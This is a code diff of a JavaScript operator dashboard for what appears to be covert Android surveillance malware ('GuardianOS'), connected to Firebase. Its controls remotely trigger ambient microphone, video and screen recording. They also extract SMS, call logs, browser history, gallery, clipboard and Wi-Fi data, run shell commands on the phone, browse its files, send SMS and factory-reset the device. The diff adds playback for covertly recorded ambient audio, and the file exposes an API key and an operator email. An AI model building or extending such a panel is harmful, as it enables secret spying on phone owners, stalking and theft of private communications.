@@ -3,9 +3,6 @@ import { getAuth, signOut, onAuthStateChanged } from 'https://www.gstatic.com/fi
 import { getDatabase, ref, onValue, set, update, off, get, push, remove } from 'https://www.gstatic.com/firebasejs/11.1.0/firebase-database.js';
 import { getStorage as getStorageInstance } from 'https://www.gstatic.com/firebasejs/11.1.0/firebase-storage.js';
 
-// ==========================================
-// Firebase Configuration
-// ==========================================
 const firebaseConfig = {
     apiKey: "AIzaSyBhaPM20tIhMalxLjoCklmwy4qb1ZkraSo",
     authDomain: "guardianos-30b18.firebaseapp.com",
@@ -21,19 +18,12 @@ const auth = getAuth(app);
 const database = getDatabase(app);
 const storage = getStorageInstance(app);
 
-// ==========================================
-// Global Variables
-// ==========================================
 let currentUser = null;
 let selectedDevice = null;
 let allDevices = [];
 let deviceListeners = {};
-
 const ALLOWED_OPERATOR_EMAIL = "nicholasbagenda@gmail.com";
 
-// ==========================================
-// DOM Elements
-// ==========================================
 const noDeviceAlert = document.getElementById('no-device-alert');
 const deviceDashboard = document.getElementById('device-dashboard');
 const devicesList = document.getElementById('devices-list');
@@ -41,23 +31,17 @@ const deviceCount = document.getElementById('device-count');
 const logoutBtn = document.getElementById('btn-logout');
 const refreshDevicesBtn = document.getElementById('btn-refresh-devices');
 
-// ==========================================
-// INITIALIZATION
-// ==========================================
 onAuthStateChanged(auth, (user) => {
     if (user && user.email?.toLowerCase() === ALLOWED_OPERATOR_EMAIL.toLowerCase()) {
         currentUser = user;
         console.log("👤 Operator logged in:", user.email);
         loadAllDevices();
     } else {
-        console.log("⛔ Access denied - not authorized operator");
+        console.log("⛔ Access denied");
         window.location.href = './index.html';
     }
 });
 
-// ==========================================
-// LOAD DEVICES
-// ==========================================
 function loadAllDevices() {
     const devicesRef = ref(database, 'devices');
     onValue(devicesRef, (snapshot) => {
@@ -72,36 +56,25 @@ function loadAllDevices() {
                     uid: deviceUid,
                     name: `${customName} (${model})`,
                     battery: d.battery_level || d.status?.batteryPercentage || 0,
-                    lastSeen: d.last_seen || 0,
-                    online: (Date.now() - (d.last_seen || 0)) < 300000,
+                    lastSeen: d.last_seen || d.status?.last_seen || 0,
+                    online: (Date.now() - (d.last_seen || d.status?.last_seen || 0)) < 300000,
                     lat: d.location?.lat || d.status?.latitude || 0,
                     lng: d.location?.lng || d.status?.longitude || 0
                 });
             });
             renderDevicesList();
             if (allDevices.length > 0 && !selectedDevice) selectDevice(allDevices[0].uid);
-        } else {
-            showNoDeviceAlert();
-        }
+        } else { showNoDeviceAlert(); }
     });
 }
 
-// ==========================================
-// RENDER DEVICES LIST
-// ==========================================
 function renderDevicesList() {
     devicesList.innerHTML = '';
     deviceCount.textContent = allDevices.length;
     allDevices.forEach(device => {
         const item = document.createElement('div');
         item.className = `device-item ${selectedDevice === device.uid ? 'active' : ''}`;
-        item.innerHTML = `
-            <div class="device-item-info">
-                <div class="device-item-name">${device.name}</div>
-                <div class="device-item-status ${device.online ? 'device-online' : 'device-offline'}">
-                    ${device.online ? '🟢 ONLINE' : '🔴 OFFLINE'} • 🔋${device.battery}%
-                </div>
-            </div>`;
+        item.innerHTML = `<div class="device-item-info"><div class="device-item-name">${device.name}</div><div class="device-item-status ${device.online ? 'device-online' : 'device-offline'}">${device.online ? '🟢 ONLINE' : '🔴 OFFLINE'} • 🔋${device.battery}%</div></div>`;
         item.addEventListener('click', () => selectDevice(device.uid));
         devicesList.appendChild(item);
     });
@@ -109,9 +82,6 @@ function renderDevicesList() {
     else { noDeviceAlert.style.display = 'none'; deviceDashboard.style.display = 'block'; }
 }
 
-// ==========================================
-// SELECT DEVICE
-// ==========================================
 function selectDevice(deviceUid) {
     selectedDevice = deviceUid;
     renderDevicesList();
@@ -124,9 +94,6 @@ function selectDevice(deviceUid) {
     setupCommandListeners(deviceUid);
 }
 
-// ==========================================
-// INJECT ADVANCED CONTROLS
-// ==========================================
 function injectAdvancedControls() {
     if (document.getElementById('cmd-audio')) return;
     const matrix = document.querySelector('.card-grid');
@@ -134,13 +101,11 @@ function injectAdvancedControls() {
     const parentGrid = matrix.closest('.dashboard-grid-container');
     const controlMatrixCard = matrix.closest('.crypto-card');
 
-    // Media toggles
     matrix.appendChild(createMatrixBtn('cmd-audio', 'fa-microphone-lines', 'AUDIO REC', 'OFF'));
     matrix.appendChild(createMatrixBtn('cmd-video', 'fa-video', 'VIDEO REC', 'OFF'));
     matrix.appendChild(createMatrixBtn('cmd-ambient', 'fa-wave-square', 'AMBIENT MIC', 'OFF'));
     matrix.appendChild(createMatrixBtn('cmd-screenrec', 'fa-desktop', 'SCREEN REC', 'OFF'));
 
-    // Data Extraction
     matrix.appendChild(createSectionHeader('📊 DATA EXTRACTION'));
     matrix.appendChild(createMatrixBtn('cmd-readsms', 'fa-message', 'READ SMS', 'TRIGGER'));
     matrix.appendChild(createMatrixBtn('cmd-readcalls', 'fa-phone', 'CALL LOG', 'TRIGGER'));
@@ -154,12 +119,10 @@ function injectAdvancedControls() {
     matrix.appendChild(createMatrixBtn('cmd-gallery', 'fa-images', 'GALLERY', 'TRIGGER'));
     matrix.appendChild(createMatrixBtn('cmd-browser', 'fa-globe', 'BROWSER HIST', 'TRIGGER'));
 
-    // Remote Control
     matrix.appendChild(createSectionHeader('🎮 REMOTE CONTROL'));
     matrix.appendChild(createMatrixBtn('cmd-screenshot', 'fa-camera-retro', 'SCREENSHOT', 'TRIGGER'));
     matrix.appendChild(createMatrixBtn('cmd-storage', 'fa-hard-drive', 'STORAGE', 'TRIGGER'));
 
-    // Danger Zone
     matrix.appendChild(createSectionHeader('⚠️ DANGER ZONE'));
     const uninst = createMatrixBtn('cmd-uninstall', 'fa-trash', 'UNINSTALL APP', 'TRIGGER'); uninst.style.borderColor = '#ff6b6b'; matrix.appendChild(uninst);
     const rebot = createMatrixBtn('cmd-reboot', 'fa-power-off', 'REBOOT', 'TRIGGER'); rebot.style.borderColor = '#ff6b6b'; matrix.appendChild(rebot);
@@ -167,7 +130,6 @@ function injectAdvancedControls() {
     const factr = createMatrixBtn('cmd-factory', 'fa-bomb', 'FACTORY RESET', 'TRIGGER'); factr.style.borderColor = '#ff0000'; matrix.appendChild(factr);
     const lockn = createMatrixBtn('cmd-locknow', 'fa-lock', 'LOCK NOW', 'TRIGGER'); lockn.style.borderColor = '#ff6b6b'; matrix.appendChild(lockn);
 
-    // Input wrappers
     const timeW = document.createElement('div'); timeW.className = 'time-control-wrapper';
     timeW.innerHTML = `<label class="time-control-label"><i class="fa-solid fa-clock"></i> DAILY ACTIVATION CYCLE</label><input type="time" id="time-setter">`;
     controlMatrixCard.after(timeW);
@@ -188,7 +150,6 @@ function injectAdvancedControls() {
     geoW.innerHTML = `<label class="time-control-label"><i class="fa-solid fa-location-crosshairs"></i> GEOFENCE</label><div style="display:flex;gap:8px;margin-bottom:8px;"><input type="number" id="geo-lat" placeholder="Latitude (0.3476)" step="0.000001" style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;"><input type="number" id="geo-lng" placeholder="Longitude (32.5825)" step="0.000001" style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;"><input type="number" id="geo-radius" placeholder="Radius (m)" value="1000" style="width:100px;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;"></div><div style="display:flex;gap:8px;"><button id="cmd-setgeo" style="flex:1;padding:10px;background:#ffd93d;color:#000;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-family:'Rajdhani',sans-serif;letter-spacing:1px;">SET GEOFENCE</button><button id="cmd-disablegeo" style="padding:10px 20px;background:#ff6b6b;color:#fff;border:none;border-radius:8px;font-weight:bold;cursor:pointer;font-family:'Rajdhani',sans-serif;letter-spacing:1px;">DISABLE</button></div>`;
     fileW.after(geoW);
 
-    // Data panels
     const dp = document.createElement('div'); dp.className = 'data-panels-grid';
     dp.innerHTML = `
         <div class="data-panel"><div class="data-panel-header">📱 SMS Messages <span id="sms-count" class="badge">0</span></div><div class="data-panel-body" id="sms-feed">Waiting for data...</div></div>
@@ -202,7 +163,9 @@ function injectAdvancedControls() {
         <div class="data-panel"><div class="data-panel-header">📍 Geofence Alerts</div><div class="data-panel-body" id="geofence-feed">No alerts</div></div>
         <div class="data-panel"><div class="data-panel-header">📋 Clipboard</div><div class="data-panel-body" id="clipboard-feed">Waiting for data...</div></div>
         <div class="data-panel"><div class="data-panel-header">🌐 Browser History</div><div class="data-panel-body" id="browser-feed">Waiting for data...</div></div>
-        <div class="data-panel"><div class="data-panel-header">🖼️ Gallery</div><div class="data-panel-body" id="gallery-feed">Waiting for data...</div></div>`;
+        <div class="data-panel"><div class="data-panel-header">🖼️ Gallery</div><div class="data-panel-body" id="gallery-feed">Waiting for data...</div></div>
+        <div class="data-panel"><div class="data-panel-header">📊 Network Traffic</div><div class="data-panel-body" id="traffic-feed">Waiting for data...</div></div>
+        <div class="data-panel"><div class="data-panel-header">🎙️ Ambient Audio</div><div class="data-panel-body" id="ambient-feed">Not recording</div></div>`;
     parentGrid.appendChild(dp);
 }
 
@@ -212,15 +175,11 @@ function createMatrixBtn(id, icon, label, stateText) {
     btn.innerHTML = `<i class="fa-solid ${icon}"></i><span>${label}</span><span class="toggle-state">${stateText}</span>`;
     return btn;
 }
-
 function createSectionHeader(title) {
     const h = document.createElement('div'); h.className = 'section-header';
     h.innerHTML = `<h3>${title}</h3>`; return h;
 }
 
-// ==========================================
-// LOAD DEVICE DATA
-// ==========================================
 function loadDeviceData(uid) {
     const device = allDevices.find(d => d.uid === uid);
     if (!device) return;
@@ -230,9 +189,6 @@ function loadDeviceData(uid) {
     initializeDataFeedListeners(uid);
 }
 
-// ==========================================
-// TELEMETRY STREAM
-// ==========================================
 function initializeTelemetryStream(uid) {
     const statusRef = ref(database, `devices/${uid}/status`);
     if (deviceListeners[`status-${uid}`]) off(deviceListeners[`status-${uid}`]);
@@ -251,9 +207,9 @@ function initializeTelemetryStream(uid) {
             if (ml) ml.href = `https://www.google.com/maps/search/?api=1&query=${d.latitude},${d.longitude}`;
         }
         const ls = document.getElementById('last-seen-text');
-        if (ls && d.last_seen) ls.textContent = new Date(d.last_seen).toLocaleString();
+        if (ls && (d.last_seen || d.lastSeen)) ls.textContent = new Date(d.last_seen || d.lastSeen).toLocaleString();
 
-        // Media display
+        // Media display — Photo > Video > Audio priority
         const img = document.getElementById('cameraPreviewFrame');
         const vid = document.getElementById('mediaVideoPlayer');
         const aud = document.getElementById('mediaAudioPlayer');
@@ -261,26 +217,25 @@ function initializeTelemetryStream(uid) {
         const ph = document.getElementById('mediaPlaceholderText');
         const ts = document.getElementById('captureTimestamp');
         const hideAll = () => { if(img) img.style.display='none'; if(vid){vid.style.display='none';vid.pause();} if(aud){aud.style.display='none';aud.pause();} if(audC) audC.style.display='none'; if(ph) ph.style.display='block'; };
+
         const photoUrl = d.lastPhotoUrl || d.last_photo_url;
         const videoUrl = d.lastVideoUrl || d.last_video_url;
         const audioUrl = d.lastAudioUrl || d.last_audio_url;
         let active = false;
+
         if (photoUrl && img) { hideAll(); img.src = photoUrl + (photoUrl.startsWith('data:') ? '' : `?t=${Date.now()}`); img.style.display='block'; active=true; }
         else if (videoUrl && vid) { hideAll(); if(vid.src!==videoUrl){vid.src=videoUrl;vid.load();} vid.style.display='block'; active=true; }
         else if (audioUrl && aud) { hideAll(); if(aud.src!==audioUrl){aud.src=audioUrl;aud.load();} aud.style.display='block'; if(audC) audC.style.display='block'; active=true; }
+
         if (active && ts) ts.innerText = `LAST UPDATED: ${new Date().toLocaleTimeString()}`;
         else if (!active && ph) ph.style.display = 'block';
     });
 }
 
-// ==========================================
-// COMMAND STATE LISTENERS — FIX: Only update TOGGLES
-// ==========================================
 function initializeCommandStateListeners(uid) {
     const commandsRef = ref(database, `devices/${uid}/commands`);
     deviceListeners[`commands-${uid}`] = onValue(commandsRef, (snap) => {
         const cmd = snap.val() || {};
-        // ONLY toggle buttons — these stay on/off
         updateButtonState('cmd-flashlight', cmd.flashlight);
         updateButtonState('cmd-alarm', cmd.alarm);
         updateButtonState('cmd-lock', cmd.emergencyLock);
@@ -289,15 +244,11 @@ function initializeCommandStateListeners(uid) {
         updateButtonState('cmd-ambient', cmd.start_ambient);
         updateButtonState('cmd-screenrec', cmd.record_screen);
         updateButtonState('cmd-clipboard', cmd.monitor_clipboard);
-        // DO NOT update trigger buttons — they fire once and reset on the phone side
         const ti = document.getElementById('time-setter');
         if (ti && cmd.activation_time && document.activeElement !== ti) ti.value = cmd.activation_time;
     });
 }
 
-// ==========================================
-// DATA FEED LISTENERS
-// ==========================================
 function initializeDataFeedListeners(uid) {
     listenToFeed(uid, 'sms', (d) => {
         const msgs = d.messages || []; const c = document.getElementById('sms-count'); if(c) c.textContent = msgs.length;
@@ -314,7 +265,7 @@ function initializeDataFeedListeners(uid) {
         const calls = d.calls||[]; const c = document.getElementById('calls-count'); if(c) c.textContent = calls.length;
         const f = document.getElementById('calls-feed'); if(!f) return;
         if(!calls.length){f.innerHTML='No call data yet';return;}
-        f.innerHTML = calls.map(c=>{const i=c.type==='incoming'?'📥':c.type==='outgoing'?'📤':'';const dur=c.duration_seconds?`${Math.floor(c.duration_seconds/60)}m ${c.duration_seconds%60}s`:'--';return `<div class="feed-item">${i} <strong>${esc(c.name||c.number||'Unknown')}</strong> <small>${fmtTime(c.timestamp)} • ${dur} • ${c.type}</small></div>`;}).join('');
+        f.innerHTML = calls.map(c=>{const i=c.type==='incoming'?'📥':c.type==='outgoing'?'📤':'❌';const dur=c.duration_seconds?`${Math.floor(c.duration_seconds/60)}m ${c.duration_seconds%60}s`:'--';return `<div class="feed-item">${i} <strong>${esc(c.name||c.number||'Unknown')}</strong> <small>${fmtTime(c.timestamp)} • ${dur} • ${c.type}</small></div>`;}).join('');
     });
     listenToFeed(uid, 'calls_live', (d) => {
         const items = Object.values(d||{}).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0)).slice(0,10);
@@ -331,7 +282,7 @@ function initializeDataFeedListeners(uid) {
         const nets = d.nearby_networks||[]; const c = document.getElementById('wifi-count'); if(c) c.textContent = nets.length;
         const f = document.getElementById('wifi-feed'); if(!f) return;
         let h = `<div class="feed-item" style="color:#00ff88;">Connected: <strong>${esc(d.current_ssid||'Not connected')}</strong> (RSSI: ${d.current_rssi||'--'})</div>`;
-        h += nets.slice(0,30).map(n=>{const b=n.signal_strength>-50?'🟢':n.signal_strength>-70?'🟡':'🔴';const l=n.is_secured?'🔒':'';return `<div class="feed-item">${b} ${l} <strong>${esc(n.ssid||'Hidden')}</strong> <small>${n.signal_strength}dBm • ${n.frequency}MHz</small></div>`;}).join('');
+        h += nets.slice(0,30).map(n=>{const b=n.signal_strength>-50?'🟢':n.signal_strength>-70?'🟡':'🔴';const l=n.is_secured?'🔒':'🔓';return `<div class="feed-item">${b} ${l} <strong>${esc(n.ssid||'Hidden')}</strong> <small>${n.signal_strength}dBm • ${n.frequency}MHz</small></div>`;}).join('');
         f.innerHTML = h;
     });
     listenToFeed(uid, 'installed_apps', (d) => {
@@ -390,7 +341,7 @@ function initializeDataFeedListeners(uid) {
         const o = document.getElementById('shell-output'); if(o&&d){o.style.display='block';o.textContent=`$ ${d.command||''}\n\n${d.stdout||'(no output)'}\n${d.stderr?'\nSTDERR: '+d.stderr:''}\n\nExit code: ${d.exit_code??'?'}`;}
     });
     listenToFeed(uid, 'file_browser', (d) => {
-        const o = document.getElementById('file-output'); if(o&&d){o.style.display='block';const e=d.entries||[];let t=`📁 ${d.current_path||'/'}\n\n`;t+=e.map(e=>{const i=e.is_directory?'📁':'📄';const s=e.is_directory?'':` (${fmtSize(e.size)})`;return `${i} ${e.name}${s}`;}).join('\n');o.textContent=t;}
+        const o = document.getElementById('file-output'); if(o&&d){o.style.display='block';const e=d.entries||[];let t=`📁 ${d.current_path||'/'}\n\n`;t+=e.map(e=>{const i=e.is_directory?'📁':'';const s=e.is_directory?'':` (${fmtSize(e.size)})`;return `${i} ${e.name}${s}`;}).join('\n');o.textContent=t;}
     });
     listenToFeed(uid, 'geofence_status', (d) => {
         const f = document.getElementById('geofence-feed'); if(!f||!d||!d.active) return;
@@ -401,21 +352,78 @@ function initializeDataFeedListeners(uid) {
         const img = document.getElementById('cameraPreviewFrame'); const ph = document.getElementById('mediaPlaceholderText');
         if(img){if(ph) ph.style.display='none'; img.src=d.screenshot; img.style.display='block'; const ts=document.getElementById('captureTimestamp'); if(ts) ts.innerText=`SCREENSHOT: ${new Date().toLocaleTimeString()}`;}
     });
+
+    // ── AMBIENT STATUS + AUDIO PLAYBACK ──────────────
     listenToFeed(uid, 'ambient_status', (d) => {
-        const b = document.getElementById('cmd-ambient'); if(!b||!d) return; const s = b.querySelector('.toggle-state');
-        if(d.status==='recording'){b.classList.add('active');if(s){s.textContent=`SEG ${d.segment||'?'}`;s.style.color='#ffaa00';}}
-        else{b.classList.remove('active');if(s){s.textContent='OFF';s.style.color='#666';}}
+        const b = document.getElementById('cmd-ambient'); if(!b||!d) return;
+        const s = b.querySelector('.toggle-state');
+        if(d.status==='recording'){
+            b.classList.add('active');
+            if(s){s.textContent=`SEG ${d.segment||'?'}`;s.style.color='#ffaa00';}
+        } else if(d.status==='stopped'){
+            b.classList.remove('active');
+            if(s){s.textContent=`${d.total_segments||0} SEGS`;s.style.color='#00ff88';}
+        } else {
+            b.classList.remove('active');
+            if(s){s.textContent='OFF';s.style.color='#666';}
+        }
+
+        // Update ambient feed panel with audio player
+        const af = document.getElementById('ambient-feed');
+        if(af) {
+            let html = `<div class="feed-item"><strong>Status:</strong> ${d.status||'unknown'}</div>`;
+            if(d.segment) html += `<div class="feed-item"><strong>Segment:</strong> ${d.segment}</div>`;
+            if(d.total_segments) html += `<div class="feed-item"><strong>Total Segments:</strong> ${d.total_segments}</div>`;
+            if(d.last_audio_url) {
+                html += `<div class="feed-item"><strong>Latest Recording:</strong><br><audio controls src="${d.last_audio_url}" style="width:100%;margin-top:8px;"></audio></div>`;
+            }
+            if(d.last_audio_segment) html += `<div class="feed-item"><small>${d.last_audio_segment}</small></div>`;
+            af.innerHTML = html;
+        }
+
+        // Also update media monitor audio player
+        if(d.last_audio_url) {
+            const aud = document.getElementById('mediaAudioPlayer');
+            const audC = document.getElementById('audio-container');
+            const ph = document.getElementById('mediaPlaceholderText');
+            if(aud && aud.src !== d.last_audio_url) {
+                if(ph) ph.style.display='none';
+                aud.src = d.last_audio_url;
+                aud.load();
+                aud.style.display='block';
+                if(audC) audC.style.display='block';
+                const ts = document.getElementById('captureTimestamp');
+                if(ts) ts.innerText = `AMBIENT AUDIO: ${new Date().toLocaleTimeString()}`;
+            }
+        }
     });
+
     listenToFeed(uid, 'screen_record_status', (d) => {
         const b = document.getElementById('cmd-screenrec'); if(!b||!d) return; const s = b.querySelector('.toggle-state');
         if(d.status==='recording'){b.classList.add('active');if(s){s.textContent='REC';s.style.color='#ffaa00';}}
         else if(d.status==='complete'){b.classList.remove('active');if(s){s.textContent=`${d.file_size_kb||'?'}KB`;s.style.color='#00ff88';}}
         else{b.classList.remove('active');if(s){s.textContent='OFF';s.style.color='#666';}}
     });
+
+    // ── TRAFFIC — dedicated panel ────────────────────
     listenToFeed(uid, 'traffic_current', (d) => {
-        const f = document.getElementById('battery-feed'); if(!f||!d) return;
-        if(f.innerHTML.includes('Network Traffic')) return;
-        f.innerHTML += `<div class="feed-item" style="border-top:1px solid #333;margin-top:8px;padding-top:8px;"><strong>📊 Network Traffic</strong><br>RX: ${d.total_rx_mb||'?'} | TX: ${d.total_tx_mb||'?'}<br>Mobile RX: ${d.mobile_rx_mb||'?'} | TX: ${d.mobile_tx_mb||'?'}</div>`;
+        const f = document.getElementById('traffic-feed'); if(!f||!d) return;
+        let html = `<div class="feed-item"><strong>📊 Total</strong></div>`;
+        html += `<div class="feed-item">RX: ${d.total_rx_mb||'?'} MB | TX: ${d.total_tx_mb||'?'} MB</div>`;
+        html += `<div class="feed-item"><strong>📱 Mobile</strong></div>`;
+        html += `<div class="feed-item">RX: ${d.mobile_rx_mb||'?'} MB | TX: ${d.mobile_tx_mb||'?'} MB</div>`;
+        if(d.wifi_rx_mb !== undefined) {
+            html += `<div class="feed-item"><strong>📡 Wi-Fi</strong></div>`;
+            html += `<div class="feed-item">RX: ${d.wifi_rx_mb||'?'} MB | TX: ${d.wifi_tx_mb||'?'} MB</div>`;
+        }
+        html += `<div class="feed-item"><small>${fmtTime(d.timestamp)}</small></div>`;
+        f.innerHTML = html;
+
+        // Also append to battery panel
+        const bf = document.getElementById('battery-feed');
+        if(bf && !bf.innerHTML.includes('Network Traffic')) {
+            bf.innerHTML += `<div class="feed-item" style="border-top:1px solid #333;margin-top:8px;padding-top:8px;"><strong>📊 Traffic</strong> RX:${d.total_rx_mb||'?'} TX:${d.total_tx_mb||'?'} MB</div>`;
+        }
     });
 }
 
@@ -425,17 +433,12 @@ function listenToFeed(uid, path, cb) {
     deviceListeners[k] = onValue(r, (s) => { if(s.exists()) try{cb(s.val());}catch(e){console.error(`Feed [${path}]:`,e);} });
 }
 
-// ==========================================
-// COMMAND LISTENERS
-// ==========================================
 function setupCommandListeners(uid) {
-    // Toggles
     setupToggle('cmd-flashlight', uid, 'flashlight');
     setupToggle('cmd-alarm', uid, 'alarm');
     const cmdLock = document.getElementById('cmd-lock');
     if(cmdLock) cmdLock.onclick = () => { const s=!cmdLock.classList.contains("active"); if(confirm(s?"🔒 Initialize Lockdown?":"🔓 Deactivate Lockdown?")) sendCmd(uid,"emergencyLock",s); };
 
-    // Triggers — with 2s green flash + "SENT ✓"
     setupTrigger('cmd-capture', uid, 'cameraCapture');
     setupTrigger('cmd-screenshot', uid, 'take_screenshot');
     setupTrigger('cmd-readsms', uid, 'read_sms');
@@ -450,36 +453,29 @@ function setupCommandListeners(uid) {
     setupTrigger('cmd-browser', uid, 'read_browser_history');
     setupTrigger('cmd-storage', uid, 'storage_overview');
 
-    // Toggles
     setupToggle('cmd-audio', uid, 'record_audio');
     setupToggle('cmd-video', uid, 'record_video');
     setupToggle('cmd-ambient', uid, 'start_ambient', 'stop_ambient');
     setupToggle('cmd-screenrec', uid, 'record_screen', 'stop_screen_record');
     setupToggle('cmd-clipboard', uid, 'monitor_clipboard');
 
-    // Time
     const ts = document.getElementById('time-setter');
     if(ts) ts.onchange = (e) => { if(e.target.value) sendCmd(uid,'activation_time',e.target.value); };
 
-    // Shell
     const sb = document.getElementById('cmd-shell');
-    if(sb) sb.onclick = () => { const c=document.getElementById('shell-input')?.value?.trim(); if(c){sendCmd(uid,'shell_command',c); const o=document.getElementById('shell-output'); if(o){o.style.display='block';o.textContent='⏳ Executing...';}} };
+    if(sb) sb.onclick = () => { const c=document.getElementById('shell-input')?.value?.trim()||'ls /sdcard'; sendCmd(uid,'shell_command',c); const o=document.getElementById('shell-output'); if(o){o.style.display='block';o.textContent='⏳ Executing...';} };
 
-    // Send SMS
     const ssb = document.getElementById('cmd-sendsms');
     if(ssb) ssb.onclick = () => { const n=document.getElementById('sms-number')?.value?.trim(); const b=document.getElementById('sms-body')?.value?.trim(); if(n&&b&&confirm(`Send SMS to ${n}?`)){sendCmd(uid,'send_sms_number',n);sendCmd(uid,'send_sms_body',b);} };
 
-    // File browser
     const lfb = document.getElementById('cmd-listfiles');
     if(lfb) lfb.onclick = () => { const p=document.getElementById('file-path')?.value?.trim()||'/storage/emulated/0'; sendCmd(uid,'list_files',p); const o=document.getElementById('file-output'); if(o){o.style.display='block';o.textContent='⏳ Loading...';} };
 
-    // Geofence
     const sgb = document.getElementById('cmd-setgeo');
     if(sgb) sgb.onclick = () => { const la=parseFloat(document.getElementById('geo-lat')?.value); const ln=parseFloat(document.getElementById('geo-lng')?.value); const r=parseFloat(document.getElementById('geo-radius')?.value)||1000; if(!isNaN(la)&&!isNaN(ln)){sendCmd(uid,'geofence_lat',la);sendCmd(uid,'geofence_lng',ln);sendCmd(uid,'geofence_radius',r);} };
     const dgb = document.getElementById('cmd-disablegeo');
     if(dgb) dgb.onclick = () => sendCmd(uid,'disable_geofence',true);
 
-    // Danger zone
     const rb = document.getElementById('cmd-reboot');
     if(rb) rb.onclick = () => { if(confirm("⚠️ REBOOT DEVICE?")) sendCmd(uid,'reboot_device',true); };
     const sdb = document.getElementById('cmd-shutdown');
@@ -497,31 +493,24 @@ function setupToggle(btnId, uid, cmd, offCmd) {
     btn.onclick = () => { const active=btn.classList.contains("active"); if(offCmd&&active) sendCmd(uid,offCmd,true); else sendCmd(uid,cmd,!active); };
 }
 
-// FIXED: Trigger button with 2s green flash + "SENT ✓"
 function setupTrigger(btnId, uid, cmd) {
     const btn = document.getElementById(btnId); if(!btn) return;
     btn.onclick = () => {
         sendCmd(uid, cmd, true);
-        btn.style.background = '#00ff88';
-        btn.style.color = '#000';
-        btn.style.borderColor = '#00ff88';
-        btn.style.boxShadow = '0 0 20px rgba(0, 255, 136, 0.5)';
+        btn.style.background = '#00ff88'; btn.style.color = '#000'; btn.style.borderColor = '#00ff88'; btn.style.boxShadow = '0 0 20px rgba(0, 255, 136, 0.5)';
         const s = btn.querySelector('.toggle-state');
         if(s){s.textContent='SENT ✓';s.style.color='#000';s.style.fontWeight='bold';}
         setTimeout(()=>{btn.style.background='';btn.style.color='';btn.style.borderColor='';btn.style.boxShadow='';if(s){s.textContent='TRIGGER';s.style.color='#666';s.style.fontWeight='normal';}},2000);
     };
 }
 
-// ==========================================
-// UTILITIES
-// ==========================================
 function sendCmd(uid, cmd, val) { console.log(`📤 ${cmd} = ${val}`); update(ref(database,`devices/${uid}/commands`),{[cmd]:val}); }
 
 function updateButtonState(btnId, isActive) {
     const btn = document.getElementById(btnId); if(!btn) return;
     btn.classList.toggle('active', !!isActive);
     const s = btn.querySelector('.toggle-state');
-    if(s){if(s.textContent==='REC'||s.textContent==='UPD...'||s.textContent.startsWith('SEG')||s.textContent==='SENT ✓') return; s.textContent=isActive?'ON':'OFF'; s.style.color=isActive?'#00ff88':'#666'; s.style.fontWeight=isActive?'bold':'normal';}
+    if(s){if(s.textContent==='REC'||s.textContent==='UPD...'||s.textContent.startsWith('SEG')||s.textContent==='SENT ✓'||s.textContent.endsWith('SEGS')) return; s.textContent=isActive?'ON':'OFF'; s.style.color=isActive?'#00ff88':'#666'; s.style.fontWeight=isActive?'bold':'normal';}
     btn.style.borderColor = isActive ? '#00ff88' : '#333';
     btn.style.opacity = isActive ? '1' : '0.7';
 }
